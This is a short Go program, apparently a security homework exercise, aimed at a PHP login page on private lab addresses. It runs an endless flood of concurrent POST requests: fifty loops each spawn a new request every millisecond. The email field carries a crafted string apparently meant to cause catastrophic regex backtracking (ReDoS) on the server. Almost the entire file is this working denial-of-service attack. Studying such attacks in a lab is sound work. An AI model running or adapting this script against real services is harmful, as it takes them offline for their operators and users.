package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"sync"
	"time"
)

var wg sync.WaitGroup

func main() {
	requestUrl := "http://10.0.2.6/Homework3/final/index.php"
	//requestUrl := "http://10.0.2.131/Homework3/redos/index.php"
	concurrentRequester := 50
	for i := 0; i < concurrentRequester; i++ {
		wg.Add(1)
		go func(requestUrl string) {
			defer wg.Done()
			for {
				go makeAttackRequest(requestUrl)
				time.Sleep(time.Millisecond)
			}
		}(requestUrl)
	}
	wg.Wait()
	fmt.Println("done")
}

func makeAttackRequest(requestUrl string) {
	formValue := url.Values{
		"email":    {"aaaaaaaaaaaaaaaaaaaaaaaax"},
		"password": {"aaaaaaaaa"},
	}
	response, err := http.PostForm(requestUrl, formValue)
	if err != nil {
		log.Println(err.Error())
	} else {
		defer response.Body.Close()
		body, _ := ioutil.ReadAll(response.Body)
		fmt.Println(string(body))
	}
}

func makeNormalRequest(requestUrl string) {
	formValue := url.Values{
		"email":    {"aaaaaaaaaaaaaaaaaaaaaaaaa"},
		"password": {"aaaaaaaaa"},
	}
	response, err := http.PostForm(requestUrl, formValue)
	if err != nil {
		log.Println(err.Error())
	} else {
		defer response.Body.Close()
		body, _ := ioutil.ReadAll(response.Body)
		fmt.Println(string(body))
	}
}
